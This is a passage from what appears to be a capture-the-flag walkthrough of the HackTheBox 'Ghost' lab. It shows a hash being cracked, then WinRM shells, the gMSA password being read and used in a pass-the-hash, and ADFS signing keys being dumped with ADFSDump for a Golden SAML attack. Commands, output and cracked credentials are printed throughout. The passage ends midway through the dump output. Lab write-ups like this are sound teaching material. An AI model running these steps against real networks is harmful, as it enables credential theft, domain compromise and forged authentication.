$ hashcat justin.bradley.netntlmv2 /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol
...[snip]...
JUSTIN.BRADLEY::ghost:79d32e6b0effca89:1cc70193c039e78478accc2d7a3a408b:01010000000000000741f1302fa0db013c34cd505f508d750000000002000800330059004c00320001001e00570049004e002d003400550030004a0046004500460048004e005600360004001400330059004c0032002e004c004f00430041004c0003003400570049004e002d003400550030004a0046004500460048004e00560036002e00330059004c0032002e004c004f00430041004c0005001400330059004c0032002e004c004f00430041004c000800300030000000000000000000000000400000e0888e65a75234c57251ce9c88f8d59a7bd7523647d2c18be64cfe3bdbd185a20a001000000000000000000000000000000000000900300048005400540050002f006200690074006200750063006b00650074002e00670068006f00730074002e006800740062000000000000000000:Qwertyuiop1234$$
...[snip]...

```

It cracks to “Qwertyuiop1234$$” very quickly.

### Shell

That password works for both SMB and WinRM:

```

oxdf@hacky$ netexec smb DC01.ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$'
SMB         10.10.11.24     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.24     445    DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$ 
oxdf@hacky$ netexec winrm DC01.ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$'
WINRM       10.10.11.24     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:ghost.htb)
WINRM       10.10.11.24     5985   DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$ (Pwn3d!)

```

I’ll connect with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```

oxdf@hacky$ evil-winrm -i dc01.ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\justin.bradley\Documents>

```

And get the first flag:

```
*Evil-WinRM* PS C:\Users\justin.bradley\desktop> type user.txt
d6b92d58************************

```

These creds do work to login on `https://core.ghost.htb:8443`, but the page just shows justin.bradley does not have access:

![image-20250329072002648](/img/image-20250329072002648.png)

## Shell as adfs\_gmsa$

### Enumeration

#### Home Directories

justin.bradley’s home directory is pretty much empty:

```
*Evil-WinRM* PS C:\Users\justin.bradley> tree /f
Folder PATH listing
Volume serial number is 2804-C13F
C:.
+---Desktop
¦       user.txt
¦
+---Documents
¦   +---WindowsPowerShell
¦           Microsoft.PowerShell_profile.ps1
¦
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Videos

```

The `Microsoft.PowerShell_profile.ps1` script is just turning off history:

```

Set-PSReadLineOption -HistorySaveStyle SaveNothing

```

Interestingly the only other users with home directories are Administrator and a service account for ADFS:

```
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/2/2024   5:30 PM                adfs_gmsa$
d-----         1/30/2024   9:19 AM                Administrator
d-----          2/4/2024   1:48 PM                justin.bradley
d-r---         1/30/2024   9:19 AM                Public

```

#### Bloodhound

My detailed instructions for setting up Bloodhound CE are [here](/2025/03/15/htb-certified.html#setup). I’ll load the data and take a look at the users I’ve already compromised.

florence.ramirez doesn’t have any interesting outbound control. justin.bradley does:

![image-20250328183745149](/img/image-20250328183745149.png)

I’ll cover the background on the ADFS\_GMSA$ account in the [next section](#adfs-background).

### Shell

#### Recover NTLM

I’ll use netexec to read gMSA passwords as justin.bradley:

```

oxdf@hacky$ netexec ldap dc01.ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$' --gmsa
LDAP        10.10.11.24     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:ghost.htb)
LDAPS       10.10.11.24     636    DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$ 
LDAPS       10.10.11.24     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.24     636    DC01             Account: adfs_gmsa$           NTLM: 9de4d086a1443bef82340604766d69c9

```

This hash works to authenticate for SMB:

```

oxdf@hacky$ netexec smb dc01.ghost.htb -u 'adfs_gmsa$' -H '4b020ee46c62ff8181f96de84088ff37'
SMB         10.10.11.24     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.24     445    DC01             [+] ghost.htb\adfs_gmsa$:4b020ee46c62ff8181f96de84088ff37 

```

Interestingly, it also works for WinRM:

```

oxdf@hacky$ netexec winrm dc01.ghost.htb -u 'adfs_gmsa$' -H '4b020ee46c62ff8181f96de84088ff37'
WINRM       10.10.11.24     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:ghost.htb)
WINRM       10.10.11.24     5985   DC01             [+] ghost.htb\adfs_gmsa$:4b020ee46c62ff8181f96de84088ff37 (Pwn3d!)

```

#### Evil-WinRM

I’m able to get a shell:

```

oxdf@hacky$ evil-winrm -i dc01.ghost.htb -u 'adfs_gmsa$' -H '4b020ee46c62ff8181f96de84088ff37'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents>

```

## Shell as mssqlserver on PRIMARY

### Core Access

#### ADFS Background

Active Directory Federation Services (ADFS) is a single sign-on (SSO) product from Microsoft that allows for logging into other services using security assertion markup language (SAML) (or other protocols such as OAuth). It allows AD to act as an identity provider (IdP) to log into non-Microsoft applications.

ADFS\_GMSA$ is the service account on Ghost used by ADFS, which I now control.

I’ll look at the auth flow for logging into `https://core.ghost.htb:8443` using the “Login using AD Federation” button:

![image-20250331073540816](/img/image-20250331073540816.png)

This generates the following two requests:

![image-20250331073700046](/img/image-20250331073700046.png)

It gets `/api/login`, which returns a redirect to `https://federation.ghost.htb/adfs/ls/` with a `SAMLRequest` parameter. This page gives the login page:

![image-20250331073752242](/img/image-20250331073752242.png)

On logging in here, there’s a series of requests:

![image-20250331073953114](/img/image-20250331073953114.png)

The first POST sends the credentials, and on success, sets a cookie and redirects back to the original page. That page now has only a form called “hidden form” that contains the `SAMLResponse` with a target back on the original site:

![image-20250331074101594](/img/image-20250331074101594.png)

And JavaScript to submit that form:

![image-20250331074133430](/img/image-20250331074133430.png)

When this form is submitted, it sends the signed response back to the site who now has an identity for the user. The POST response sets a cookie, and redirects to `/`. `/` sees this user can’t access the main page and redirects to `/unauthorized`.

The auth flow was still successful in identifying the user from AD to the site, even if the site then limited the privileges of that user.

The `SAMLResponse` can be base64-decoded to generate XML:

```

oxdf@hacky$ echo "PHNhbWxwOlJlc3BvbnNlIElEPSJfZDVkNzAyOTEtNTMwMy00YjQyLTlkNzQtNjhmOGE1NWNjOGJlIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNS0wMy0zMVQxMTo0MToyOC4xMDhaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiIENvbnNlbnQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjb25zZW50OnVuc3BlY2lmaWVkIiBJblJlc3BvbnNlVG89Il9hN2JmMmIzZmVhMzRiNDA5YzI5ZjFhN2ZhNDg5ODM1NWZiOTNjMTMxIiB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vZmVkZXJhdGlvbi5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxzYW1scDpTdGF0dXM+PHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIgLz48L3NhbWxwOlN0YXR1cz48QXNzZXJ0aW9uIElEPSJfYTQ3ZDFhODYtZDQ0Ni00NTI2LTg1NDAtODg1MzI2NzI2NWQyIiBJc3N1ZUluc3RhbnQ9IjIwMjUtMDMtMzFUMTE6NDE6MjguMTA4WiIgVmVyc2lvbj0iMi4wIiB4bWxucz0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI+PElzc3Vlcj5odHRwOi8vZmVkZXJhdGlvbi5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIiAvPjxkczpTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNyc2Etc2hhMjU2IiAvPjxkczpSZWZlcmVuY2UgVVJJPSIjX2E0N2QxYTg2LWQ0NDYtNDUyNi04NTQwLTg4NTMyNjcyNjVkMiI+PGRzOlRyYW5zZm9ybXM+PGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIiAvPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiIC8+PC9kczpUcmFuc2Zvcm1zPjxkczpEaWdlc3RNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGVuYyNzaGEyNTYiIC8+PGRzOkRpZ2VzdFZhbHVlPncrUEFCNnM4elovVy9JVzEyVDJHbExiUGx3Zy85eVh1NmNjdWVpOHZ4Mkk9PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8+PGRzOlNpZ25hdHVyZVZhbHVlPkpPN0lYQXBSdXpnL25xck96U3ZMbXR4SFdkTFhFa0VvYlA1VDdvMWM1Zi9PVCtDOGZ2R3FCTGRjSW0waU9SdlNyUTJtZmJXKzI4RVF1TDJnYXIrMm51MU1GT0xoREdDVW8wWGRScXBPc21RZUJiVTRodTQ0NlBuVmkyZCtuOGVjWlAzd0YrRE9BTEtVT05Kbkd5MGxrSEdYN08zZnBQZG1UVnh1NGFpRVFySWF4Y01tNFpBR1FpVi9KWUxRNmF0RWhaeE1Db0k5T0tNcnBWVEVCSVFXNGROZnVUOGJrZmxWSWVoWXlER3FKSDJhTy9FNVU1S1o3Z1FHTnlMbDVPRDY3c25EV1BvenJBbU1VZFZsalFGeEhkb0h2NWRGU24rWlVrVzRaSUlIajRVQi9QZHpUY0pZTDBMNklwZFJzT1NlUlpjNGxXbnRoV2xYSDhwZDhndGk4aGhjcWZMaWVGVVIwTmJwTGtEaXEvd3ZLZGVmUVNXSmY5a2diWndWeTJGYUJTZGk2R3g4ZGxIRDZyeXphSTd1ZC9VcEtrVTZ3VDhPZ3B3Mm1LbmxMWml3dmVHZjFsTXNRNklCZE1ac0ZpUUJqaHpFQ3ZORWk2TmkvUENGNlpQRVlWQW5UU0FiY0Q3ZEVCandyVW9WNUNvZ0ZjUWxZUm1PaUxFekFzd21mYUZVUkxIOVdDTEVlYmxWVjczeldBZzJxazZVZnltYjVUWmpRSDlVR2lXcGlmSDgzcDA0R2RJdHN5TVY2UW9nWjNFdDZFWkwrWmZXREhVQTFxQTcxcjNDekZMQzgwdjNOT1Bpakx0a2YrcEEzLytKTmZNRjlFTFgyRmRKcTBzMC9UaWZibDlHRHZnbWRsSUMyRXFPWjJvMHlVUGFKWERwRUhjbjV3cFFWbmJXK2JZPTwvZHM6U2lnbmF0dXJlVmFsdWU+PEtleUluZm8geG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpYNTA5RGF0YT48ZHM6WDUwOUNlcnRpZmljYXRlPk1JSUU1akNDQXM2Z0F3SUJBZ0lRSkZjV3dNeWJSYTVPNCtXTzV0V29HVEFOQmdrcWhraUc5dzBCQVFzRkFEQXVNU3d3S2dZRFZRUURFeU5CUkVaVElGTnBaMjVwYm1jZ0xTQm1aV1JsY21GMGFXOXVMbWRvYjNOMExtaDBZakFnRncweU5EQTJNVGd4TmpFM01UQmFHQTh5TVRBME1EVXpNREUyTVRjeE1Gb3dMakVzTUNvR0ExVUVBeE1qUVVSR1V5QlRhV2R1YVc1bklDMGdabVZrWlhKaGRHbHZiaTVuYUc5emRDNW9kR0l3Z2dJaU1BMEdDU3FHU0liM0RRRUJBUVVBQTRJQ0R3QXdnZ0lLQW9JQ0FRQytBQU9JZkVxdGxZY24xNTNMMUJ2R1FnRHlYVG5Zd1RSenNLNTkrekUxemdHS085TjVuYjhGaytkYUtwV0xRYWlIN29ESGFlbncvUWF4Qmc1cWRlRFltRDNvejhLeWFBMXlnWUJyem00d1c3RmY4N3JLOUZlNUo1L2g2VzlnNzQ5aDVCSXFQUU9wMGw2czFyZnVtT2NjTjR5Ylc5NUVXTkwwdnVRWHZDK0tRNEQ0Z01YdThtQ0dweHR2SUw4aWxOdEp1SUczT1JZU0toUmFsMHl5SmVPaEc0eGdsclpKRjE4cDl3aG5FNm9tZ2dtQTZuMnNoRGsvdHZUWWppaTVlNy9pY1dUS2tyc01DcGFLVU5rN214ZE1aaFFhYjdTbWZLclpONHBSRDdkVmc1enpJeUQ3VXpTOUNITEM2eE56cS9aMGh1YU9hSmhPU2RKU2dhdC9ic0c4bmJ4MTlIRC8reXBXOUoyTHRORnVnZFd0bVVCV0RPUUJZVmhCOFNnNFZFR2dQOWp5SXRISDJienNEZmpSZEo4RTF1TkpXUC9rUUExK3dZbE9kZExxVTNiMElzQ3ZsQThFdllXMFQxUnN1NzdvNHgvdzBnV2Iwb1FQRUl6N3o5NzNiNDk2d3FRdDNEbnlmZU8zbFhYZlpOY3ZhajVLQ1AyVHRHQitLc2hGOXBrSVB4cTdGMmdNaDdRanhqUkhzQTI5VjhqRm85Z0xEN2tQVmljYUlVZHNnaUZIbllRRjE0YTUySnRSMVY1aU4raDk1Smt1dUVxUVdEQkhBdlBFQkJaa0VaSCs1eVQrYUNGWFhYK0JwUHQzUUdqWUxlSlU4Q0ZzTXRuOFFWTFl2TGRjVlJzVW5SaC9XSGlYd0pPT0VWRUNhOXc3L3lWbmhhbENOQngxRS9sNEtRSURBUUFCTUEwR0NTcUdTSWIzRFFFQkN3VUFBNElDQVFBV1lLWlczY0RDQk82ZFQzeWZsM09jdXlwMUxWS1ZJKzlwRngvYmJXcFdqU2RoNmIzOUxUeHhEN0ZZVXRodVdQWjNyRjRHK0ZkTUZISEN4M1lwRW1VRm5FTEtzWHFoWjk4OUFYNThJLzNtYmZVbEtXZUlQTFNMa3ArZVJab01Ka3Q3azEvS1h0RGFzT1FuME5zZ1lFb3dMQkltTUNNdTl1dWpuQ21GT3dIUC9JQmhnWVFNSGg0NkJ6U1hXUDNpOFZYYnJSdERwby9jLy9PRkpoR21ubkY4WlBtaTR4dHpmU0RCcFZLcXdWTHA3OENndU14alFkK2JkVWI0NTU4OFpKNENMc1BkUlFwMzBXSjEvQ05JYWVudkpXdEEyRzVJWnc1VTBFV0NKTG9ZSldGczlpeU9hMS95NTVydVc2SjhsSUdEMHdtb0VlQ2w5Q0gxRWQ0ZHpVZFVYZjFNQkNZUDNYOTJpYXh6VUUwdXBHZC8xUW82SFR5eU9sV3VBd3JrVDJWSEVMS1ZaS09nOCtkbHk5N2d5WklmVXRRd0lrUHdObDh2bzA0Y2ZqK2h6T3ZCelBLQUFZaDE0TkxndmVBSS9EcU1uTzBPS08rdzFIQkt3NjROQkNuOGdvYXpGK1B1RmZVTzB5TkhGTDRreE1wY2FwNmlldjZnM0JYQ1NEd2ZxVFVPRXVFczdxOW9ZS2dxMnFuTlZPVEloaEluTVhCekVtNmlQMTNqZnVPb1hKZFBBbkVVWG40eTV5d0E5N3J0YkduWkVQeXgxZjFFa1gvaGJxQlA0dm9ndjlrbHRhVUVFVlhrUytoUHB4Wm1leENOckJEMXE3R0ovNTBlYllsQzBDZXY4dzZNczh0TTBPcnZwcEdZbFdydFB3ZXZFdmZpUmt3QkxHN0VNQW5MU3c9PTwvZHM6WDUwOUNlcnRpZmljYXRlPjwvZHM6WDUwOURhdGE+PC9LZXlJbmZvPjwvZHM6U2lnbmF0dXJlPjxTdWJqZWN0PjxTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI+PFN1YmplY3RDb25maXJtYXRpb25EYXRhIEluUmVzcG9uc2VUbz0iX2E3YmYyYjNmZWEzNGI0MDljMjlmMWE3ZmE0ODk4MzU1ZmI5M2MxMzEiIE5vdE9uT3JBZnRlcj0iMjAyNS0wMy0zMVQxMTo0NjoyOC4xMDhaIiBSZWNpcGllbnQ9Imh0dHBzOi8vY29yZS5naG9zdC5odGI6ODQ0My9hZGZzL3NhbWwvcG9zdFJlc3BvbnNlIiAvPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q+PENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDI1LTAzLTMxVDExOjQxOjI4LjEwOFoiIE5vdE9uT3JBZnRlcj0iMjAyNS0wMy0zMVQxMjo0MToyOC4xMDhaIj48QXVkaWVuY2VSZXN0cmljdGlvbj48QXVkaWVuY2U+aHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzPC9BdWRpZW5jZT48L0F1ZGllbmNlUmVzdHJpY3Rpb24+PC9Db25kaXRpb25zPjxBdHRyaWJ1dGVTdGF0ZW1lbnQ+PEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy91cG4iPjxBdHRyaWJ1dGVWYWx1ZT5qdXN0aW4uYnJhZGxleUBnaG9zdC5odGI8L0F0dHJpYnV0ZVZhbHVlPjwvQXR0cmlidXRlPjxBdHRyaWJ1dGUgTmFtZT0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvY2xhaW1zL0NvbW1vbk5hbWUiPjxBdHRyaWJ1dGVWYWx1ZT5qdXN0aW4uYnJhZGxleTwvQXR0cmlidXRlVmFsdWU+PC9BdHRyaWJ1dGU+PC9BdHRyaWJ1dGVTdGF0ZW1lbnQ+PEF1dGhuU3RhdGVtZW50IEF1dGhuSW5zdGFudD0iMjAyNS0wMy0zMVQxMTo0MToxNi41MTRaIj48QXV0aG5Db250ZXh0PjxBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZFByb3RlY3RlZFRyYW5zcG9ydDwvQXV0aG5Db250ZXh0Q2xhc3NSZWY+PC9BdXRobkNvbnRleHQ+PC9BdXRoblN0YXRlbWVudD48L0Fzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg==" | base64 -d | xmllint - --format
<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_d5d70291-5303-4b42-9d74-68f8a55cc8be" Version="2.0" IssueInstant="2025-03-31T11:41:28.108Z" Destination="https://core.ghost.htb:8443/adfs/saml/postResponse" Consent="urn:oasis:names:tc:SAML:2.0:consent:unspecified" InResponseTo="_a7bf2b3fea34b409c29f1a7fa4898355fb93c131">
  <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">http://federation.ghost.htb/adfs/services/trust</Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_a47d1a86-d446-4526-8540-8853267265d2" IssueInstant="2025-03-31T11:41:28.108Z" Version="2.0">
    <Issuer>http://federation.ghost.htb/adfs/services/trust</Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#_a47d1a86-d446-4526-8540-8853267265d2">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue>w+PAB6s8zZ/W/IW12T2GlLbPlwg/9yXu6ccuei8vx2I=</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>JO7IXApRuzg/nqrOzSvLmtxHWdLXEkEobP5T7o1c5f/OT+C8fvGqBLdcIm0iORvSrQ2mfbW+28EQuL2gar+2nu1MFOLhDGCUo0XdRqpOsmQeBbU4hu446PnVi2d+n8ecZP3wF+DOALKUONJnGy0lkHGX7O3fpPdmTVxu4aiEQrIaxcMm4ZAGQiV/JYLQ6atEhZxMCoI9OKMrpVTEBIQW4dNfuT8bkflVIehYyDGqJH2aO/E5U5KZ7gQGNyLl5OD67snDWPozrAmMUdVljQFxHdoHv5dFSn+ZUkW4ZIIHj4UB/PdzTcJYL0L6IpdRsOSeRZc4lWnthWlXH8pd8gti8hhcqfLieFUR0NbpLkDiq/wvKdefQSWJf9kgbZwVy2FaBSdi6Gx8dlHD6ryzaI7ud/UpKkU6wT8Ogpw2mKnlLZiwveGf1lMsQ6IBdMZsFiQBjhzECvNEi6Ni/PCF6ZPEYVAnTSAbcD7dEBjwrUoV5CogFcQlYRmOiLEzAswmfaFURLH9WCLEeblVV73zWAg2qk6Ufymb5TZjQH9UGiWpifH83p04GdItsyMV6QogZ3Et6EZL+ZfWDHUA1qA71r3CzFLC80v3NOPijLtkf+pA3/+JNfMF9ELX2FdJq0s0/Tifbl9GDvgmdlIC2EqOZ2o0yUPaJXDpEHcn5wpQVnbW+bY=</ds:SignatureValue>
      <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
        <ds:X509Data>
          <ds:X509Certificate>MIIE5jCCAs6gAwIBAgIQJFcWwMybRa5O4+WO5tWoGTANBgkqhkiG9w0BAQsFADAuMSwwKgYDVQQDEyNBREZTIFNpZ25pbmcgLSBmZWRlcmF0aW9uLmdob3N0Lmh0YjAgFw0yNDA2MTgxNjE3MTBaGA8yMTA0MDUzMDE2MTcxMFowLjEsMCoGA1UEAxMjQURGUyBTaWduaW5nIC0gZmVkZXJhdGlvbi5naG9zdC5odGIwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQC+AAOIfEqtlYcn153L1BvGQgDyXTnYwTRzsK59+zE1zgGKO9N5nb8Fk+daKpWLQaiH7oDHaenw/QaxBg5qdeDYmD3oz8KyaA1ygYBrzm4wW7Ff87rK9Fe5J5/h6W9g749h5BIqPQOp0l6s1rfumOccN4ybW95EWNL0vuQXvC+KQ4D4gMXu8mCGpxtvIL8ilNtJuIG3ORYSKhRal0yyJeOhG4xglrZJF18p9whnE6omggmA6n2shDk/tvTYjii5e7/icWTKkrsMCpaKUNk7mxdMZhQab7SmfKrZN4pRD7dVg5zzIyD7UzS9CHLC6xNzq/Z0huaOaJhOSdJSgat/bsG8nbx19HD/+ypW9J2LtNFugdWtmUBWDOQBYVhB8Sg4VEGgP9jyItHH2bzsDfjRdJ8E1uNJWP/kQA1+wYlOddLqU3b0IsCvlA8EvYW0T1Rsu77o4x/w0gWb0oQPEIz7z973b496wqQt3DnyfeO3lXXfZNcvaj5KCP2TtGB+KshF9pkIPxq7F2gMh7QjxjRHsA29V8jFo9gLD7kPVicaIUdsgiFHnYQF14a52JtR1V5iN+h95JkuuEqQWDBHAvPEBBZkEZH+5yT+aCFXXX+BpPt3QGjYLeJU8CFsMtn8QVLYvLdcVRsUnRh/WHiXwJOOEVECa9w7/yVnhalCNBx1E/l4KQIDAQABMA0GCSqGSIb3DQEBCwUAA4ICAQAWYKZW3cDCBO6dT3yfl3Ocuyp1LVKVI+9pFx/bbWpWjSdh6b39LTxxD7FYUthuWPZ3rF4G+FdMFHHCx3YpEmUFnELKsXqhZ989AX58I/3mbfUlKWeIPLSLkp+eRZoMJkt7k1/KXtDasOQn0NsgYEowLBImMCMu9uujnCmFOwHP/IBhgYQMHh46BzSXWP3i8VXbrRtDpo/c//OFJhGmnnF8ZPmi4xtzfSDBpVKqwVLp78CguMxjQd+bdUb45588ZJ4CLsPdRQp30WJ1/CNIaenvJWtA2G5IZw5U0EWCJLoYJWFs9iyOa1/y55ruW6J8lIGD0wmoEeCl9CH1Ed4dzUdUXf1MBCYP3X92iaxzUE0upGd/1Qo6HTyyOlWuAwrkT2VHELKVZKOg8+dly97gyZIfUtQwIkPwNl8vo04cfj+hzOvBzPKAAYh14NLgveAI/DqMnO0OKO+w1HBKw64NBCn8goazF+PuFfUO0yNHFL4kxMpcap6iev6g3BXCSDwfqTUOEuEs7q9oYKgq2qnNVOTIhhInMXBzEm6iP13jfuOoXJdPAnEUXn4y5ywA97rtbGnZEPyx1f1EkX/hbqBP4vogv9kltaUEEVXkS+hPpxZmexCNrBD1q7GJ/50ebYlC0Cev8w6Ms8tM0OrvppGYlWrtPwevEvfiRkwBLG7EMAnLSw==</ds:X509Certificate>
        </ds:X509Data>
      </KeyInfo>
    </ds:Signature>
    <Subject>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData InResponseTo="_a7bf2b3fea34b409c29f1a7fa4898355fb93c131" NotOnOrAfter="2025-03-31T11:46:28.108Z" Recipient="https://core.ghost.htb:8443/adfs/saml/postResponse"/>
      </SubjectConfirmation>
    </Subject>
    <Conditions NotBefore="2025-03-31T11:41:28.108Z" NotOnOrAfter="2025-03-31T12:41:28.108Z">
      <AudienceRestriction>
        <Audience>https://core.ghost.htb:8443</Audience>
      </AudienceRestriction>
    </Conditions>
    <AttributeStatement>
      <Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn">
        <AttributeValue>justin.bradley@ghost.htb</AttributeValue>
      </Attribute>
      <Attribute Name="http://schemas.xmlsoap.org/claims/CommonName">
        <AttributeValue>justin.bradley</AttributeValue>
      </Attribute>
    </AttributeStatement>
    <AuthnStatement AuthnInstant="2025-03-31T11:41:16.514Z">
      <AuthnContext>
        <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</AuthnContextClassRef>
      </AuthnContext>
    </AuthnStatement>
  </Assertion>
</samlp:Response>

```

The `AttributeStatement` contains the claims of what user this is:

```

 <Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn">
        <AttributeValue>justin.bradley@ghost.htb</AttributeValue>
      </Attribute>
      <Attribute Name="http://schemas.xmlsoap.org/claims/CommonName">
        <AttributeValue>justin.bradley</AttributeValue>
      </Attribute>

```

I’ll use this format later.

#### Golden SAML Background

[This post](https://www.netwrix.com/golden_saml_attack.html) from netwrix walks through the steps of a Golden SAML attack. The idea is to dump the private key material from the server so that I can forge `SAMLResponse` messages. Then I can log into the application as any user I want.

The post shows using [ADFSDump](https://github.com/mandiant/ADFSDump), a tool from Mandiant, to recover this information. After some re-formatting, it uses another Mandiant tool, [ADFSSpoof.py](https://github.com/mandiant/ADFSpoof) to forge a `SAMLResponse`, and then inserts that into the flow to get authentication.

#### Dump ADFS Key Material

I’ll grab a copy of `ADFSDump.exe` from [SharpCollection](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/ADFSDump.exe) and upload it to Ghost:

```
*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents> upload ADFSDump.exe
                                        
Info: Uploading /home/oxdf/hackthebox/ghost-10.10.11.24/ADFSDump.exe to C:\Users\adfs_gmsa$\Documents\ADFSDump.exe
                                        
Data: 38912 bytes of 38912 bytes copied
                                        
Info: Upload successful!

```

Running it dumps all the ADFS material:

```
*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents> .\ADFSDump.exe
    ___    ____  ___________ ____
   /   |  / __ \/ ____/ ___// __ \__  ______ ___  ____
  / /| | / / / / /_   \__ \/ / / / / / / __ `__ \/ __ \
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / / / / / / /_/ /
/_/  |_/_____/_/    /____/_____/\__,_/_/ /_/ /_/ .___/
                                              /_/
Created by @doughsec

## Extracting Private Key from Active Directory Store
[-] Domain is ghost.htb
[-] Private Key: FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7
[-] Private Key: 8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1

## Reading Encrypted Signing Key from Database
[-] Encrypted Token Signing Key Begin
